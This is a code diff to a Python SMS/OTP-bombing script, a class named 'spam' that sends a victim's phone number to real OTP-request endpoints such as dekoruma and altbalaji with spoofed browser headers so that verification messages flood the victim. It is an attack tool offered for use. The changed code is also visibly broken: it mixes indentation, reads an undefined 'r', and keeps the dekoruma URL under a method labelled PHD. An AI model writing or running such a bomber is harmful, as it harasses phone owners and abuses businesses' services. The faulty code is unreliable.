@@ -58,11 +58,11 @@ class spam:
 			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
 
 	def phd(self):
-		dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone_number":self.nomer})).text
-            if '{"status":"ok"}' in dekor2:
-                return f'\x1b[91mSpamm dekoruma {self.nomer} {h}Success!'
+		param=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone_number":self.nomer})).text
+            if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
+			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
 		else:
-			return f'\x1b[92mSpamm dekoruma {self.nomer} \x1b[91mFail!'
+			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
 			
 	def balaji(self):
 		urlb="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
